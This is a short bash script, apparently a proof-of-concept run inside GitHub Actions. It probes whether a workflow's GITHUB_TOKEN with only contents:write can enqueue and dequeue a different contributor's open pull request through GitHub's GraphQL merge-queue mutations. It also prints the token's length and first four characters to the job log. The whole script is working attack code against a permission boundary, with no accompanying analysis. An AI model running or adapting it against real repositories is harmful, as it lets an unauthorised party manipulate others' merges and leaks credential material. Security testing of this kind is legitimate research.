#!/usr/bin/env bash
set -u
echo "QA|CTX|event=${GITHUB_EVENT_NAME}|ref=${GITHUB_REF}"
if [ -z "${GITHUB_TOKEN:-}" ]; then echo "QA|VOID|no token"; echo "QA|DONE"; exit 0; fi
echo "QA|TOKEN|len=${#GITHUB_TOKEN}|prefix=${GITHUB_TOKEN:0:4}"
gql(){ curl -s -H "Authorization: bearer ${GITHUB_TOKEN}" -H 'Content-Type: application/json' \
        -X POST -d "$1" https://api.github.com/graphql; }
# resolve the target PR's node id (a DIFFERENT open PR, not this entry)
q='{"query":"query{repository(owner:\"kovac-labs\",name:\"zz-mq-tok-1027\"){pullRequest(number:30){id number state mergeStateStatus}}}"}'
r=$(gql "$q")
echo "QA|TARGET|$(printf '%s' "$r" | head -c 260)"
pid=$(printf '%s' "$r" | python3 -c 'import sys,json;print((json.load(sys.stdin).get("data") or {}).get("repository",{}).get("pullRequest",{}).get("id",""))' 2>/dev/null)
echo "QA|TARGET-ID|${pid:0:24}"
if [ -z "$pid" ]; then echo "QA|VOID|could not resolve target PR id"; echo "QA|DONE"; exit 0; fi
# THE DECISIVE CALL: can an installation token holding only contents:write enqueue someone else's PR?
m="{\"query\":\"mutation{enqueuePullRequest(input:{pullRequestId:\\\"${pid}\\\"}){mergeQueueEntry{id state position}}}\"}"
echo "QA|ENQUEUE-RESULT|$(gql "$m" | head -c 320)"
# and dequeue, the other half of the queue-admin pair
d="{\"query\":\"mutation{dequeuePullRequest(input:{id:\\\"${pid}\\\"}){mergeQueueEntry{id state}}}\"}"
echo "QA|DEQUEUE-RESULT|$(gql "$d" | head -c 320)"
echo "QA|DONE"
